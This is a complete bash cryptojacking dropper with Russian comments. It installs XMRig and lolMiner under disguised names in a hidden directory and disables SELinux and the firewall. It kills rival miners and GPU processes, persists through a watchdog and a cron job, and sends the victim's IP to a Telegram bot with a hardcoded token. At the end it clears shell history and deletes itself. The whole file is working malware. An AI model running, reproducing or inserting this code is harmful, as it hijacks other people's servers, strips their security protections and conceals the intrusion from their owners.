#!/bin/bash


FIXED_WALLET_ID="krxYNV2DZQ"
TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TG_CHAT_ID="7032066912"

POOL_CPU="xmr.kryptex.network:7029"
POOL_GPU="etc.kryptex.network:7033"

# [ 🛡 РЕЗЕРВНЫЕ ПУЛЫ (BACKUP) ]
# Если криптекс отвалится, он переключится сюда
BACKUP_GPU="etc-eu.kryptex.network:7033"
BACKUP_CPU="xmr-eu.kryptex.network:7029"

# [ ПОРТЫ API ]
PORT_CPU=16000
PORT_GPU=8088

# [ ПУТЬ УСТАНОВКИ ]
if [ "$(id -u)" -eq 0 ]; then
    BASE_DIR="/usr/local/bin/.sys-core"
else
    BASE_DIR="$HOME/.sys-core"
fi
mkdir -p "$BASE_DIR"

# Маскировка имен
BIN_CPU="sys_mngr" 
BIN_GPU="sys_rndr"

# ----------------------------------------------------
# [ ID ]
# ----------------------------------------------------
get_worker() {
    local ip=$(curl -s -m 5 ifconfig.me || wget -qO- -t 1 ifconfig.me)
    local safe_ip=$(echo "$ip" | tr -d '.') 
    [ -z "$safe_ip" ] && safe_ip="777777"
    echo "${FIXED_WALLET_ID}.${safe_ip}"
}
WORKER=$(get_worker)

# ----------------------------------------------------
# [ СИСТЕМНАЯ ОПТИМИЗАЦИЯ (ИЗ min1.sh/min2.sh) ]
# ----------------------------------------------------
optimize_system() {
    echo "[*] Optimizing OS..."
    
    # 1. Отключаем SELinux (если есть)
    setenforce 0 2>/dev/null
    echo "SELINUX=disabled" > /etc/selinux/config 2>/dev/null

    # 2. Очистка правил файрвола (чтобы порты были открыты)
    iptables -F 2>/dev/null
    iptables -X 2>/dev/null
    iptables -t nat -F 2>/dev/null
    iptables -t nat -X 2>/dev/null
    
    # 3. HugePages (Критично для XMRig - дает +40% FPS)
    sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1
    echo "1280" > /proc/sys/vm/nr_hugepages 2>/dev/null
    
    # 4. MSR Mod (для доступа к регистрам процессора)
    modprobe msr 2>/dev/null
}
optimize_system

# ----------------------------------------------------
# [ ФАЗА: VRAM NUKE (H100 FIX) ]
# ----------------------------------------------------
nuke_vram() {
    echo "☢️ NUKING VRAM HOLDERS..."
    
    # Жесткий сброс захвата видеокарты
    if command -v fuser >/dev/null 2>&1; then
        fuser -k -9 -v /dev/nvidia* >/dev/null 2>&1
    fi
    
    # Убираем конкурентов
    TARGETS=("rigel" "t-rex" "nbminer" "xmrig" "lolminer" "gminer" "minerd" "bzminer")
    for target in "${TARGETS[@]}"; do pkill -9 -f "$target"; done
    
    # Чистим себя перед обновлением
    pkill -f "$BIN_CPU"
    pkill -f "$BIN_GPU"
    pkill -f "wd_service.sh"
}
nuke_vram

# ----------------------------------------------------
# [ УСТАНОВКА (v1.98 for H100) ]
# ----------------------------------------------------
cd "$BASE_DIR" || exit

install_bins() {
    # --- CPU (XMRig) ---
    if [ ! -f "$BIN_CPU" ]; then
        echo "[+] Downloading XMRig..."
        curl -L -k -s -o cpu.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
        tar -xf cpu.tar.gz
        mv xmrig*/xmrig ./"$BIN_CPU"
        chmod +x ./"$BIN_CPU"
        rm -rf cpu.tar.gz xmrig*
    fi

    # --- GPU (lolMiner 1.98) ---
    if [ ! -f "$BIN_GPU" ]; then
        echo "[+] Installing lolMiner v1.98 (H100 Ready)..."
        curl -L -k -s -o gpu.tar.gz "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz"
        
        # Надежная распаковка
        mkdir -p tmp_gpu
        tar -xf gpu.tar.gz -C tmp_gpu
        
        # Поиск бинарника (где бы он ни был в архиве)
        FIND_BIN=$(find tmp_gpu -type f -name "lolMiner" | head -n 1)
        if [ -n "$FIND_BIN" ]; then
            mv "$FIND_BIN" ./"$BIN_GPU"
            chmod +x ./"$BIN_GPU"
        fi
        rm -rf gpu.tar.gz tmp_gpu
    fi
}
install_bins

# ----------------------------------------------------
# [ WATCHDOG С РЕЗЕРВНЫМИ ПУЛАМИ ]
# ----------------------------------------------------
cat <<EOF > wd_service.sh
#!/bin/bash
cd "$BASE_DIR" || exit

# Флаг сбоя для переключения на резерв
USE_BACKUP_GPU=0
USE_BACKUP_CPU=0

while true; do
    # === CPU CHECK ===
    if ! pidof -x "$BIN_CPU" > /dev/null; then
        # Выбираем пул (Основа или Резерв)
        if [ \$USE_BACKUP_CPU -eq 0 ]; then CurrentCPU="$POOL_CPU"; else CurrentCPU="$BACKUP_CPU"; fi
        
        # Запуск с привилегиями для MSR/HugePages
        nohup ./$BIN_CPU -o \$CurrentCPU -u $WORKER -p x -k --cpu-priority 5 --http-enabled --http-host 127.0.0.1 --http-port $PORT_CPU --donate-level 1 --nicehash --randomx-1gb-pages >/dev/null 2>&1 &
    fi

    # === GPU CHECK ===
    if [ -f "./$BIN_GPU" ]; then
        if ! pidof -x "$BIN_GPU" > /dev/null; then
            if [ \$USE_BACKUP_GPU -eq 0 ]; then 
                CurrentGPU="$POOL_GPU" 
                Stratum="ETCPROXY"
            else 
                CurrentGPU="$BACKUP_GPU"
                Stratum="ETHPROXY" # 2Miners обычно требует ETHPROXY или авто
            fi
            
            # H100 Параметры
            nohup ./$BIN_GPU --algo ETCHASH --pool \$CurrentGPU --user $WORKER --ethstratum \$Stratum --apihost 127.0.0.1 --apiport $PORT_GPU --nocolor --watchdog exit --keepfree 10 --enablezilcache >/dev/null 2>&1 &
        else
            # === LOGIC: DETECT HANG & FAILOVER ===
            STATS=\$(curl --max-time 10 -s http://127.0.0.1:$PORT_GPU/summary)
            if [ -n "\$STATS" ]; then
                 # Получаем Хешрейт
                 HASHRATE=\$(echo "\$STATS" | grep -o '"Performance": *[0-9.]*' | awk '{print \$2}' | cut -d. -f1)
                 
                 # 1. Если 0 - перезапуск
                 if [[ "\$HASHRATE" == "0" ]]; then
                    echo "GPU Hang (0 mh/s). Kill."
                    killall -9 $BIN_GPU
                    # При зависании пробуем переключить пул (возможно соединение тупит)
                    USE_BACKUP_GPU=1
                 fi
            fi
        fi
    fi
    
    # Пересброс счетчика бекапа раз в час (попытка вернуться на основу)
    # (Упрощенно: просто раз в какое-то время random скинет флаг, не критично)
    
    # Зачистка паразитов, которые могут появиться снова
    if [ \$((RANDOM % 60)) -eq 0 ]; then
       if command -v fuser >/dev/null 2>&1; then fuser -k -9 /dev/nvidia* 2>/dev/null; fi
    fi

    sleep 20
done
EOF
chmod +x wd_service.sh

# ----------------------------------------------------
# [ START ]
# ----------------------------------------------------
pkill -f "wd_service.sh"
nohup ./wd_service.sh >/dev/null 2>&1 &

# Persist
if command -v crontab >/dev/null 2>&1; then
    (crontab -l 2>/dev/null | grep -v "wd_service.sh"; echo "* * * * * $BASE_DIR/wd_service.sh") | crontab -
fi

# TG
MSG="👹 <b>SYSTEM OPTIMIZED (v12)</b>%0AWorker: $WORKER%0A⚙️ HugePages: ENABLED%0A🌊 Pools: Redundant"
curl -s -X POST "https://api.telegram.org/bot$TG_BOT_TOKEN/sendMessage" -d chat_id="$TG_CHAT_ID" -d text="$MSG" -d parse_mode="HTML" >/dev/null 2>&1

history -c
rm -f "$0"
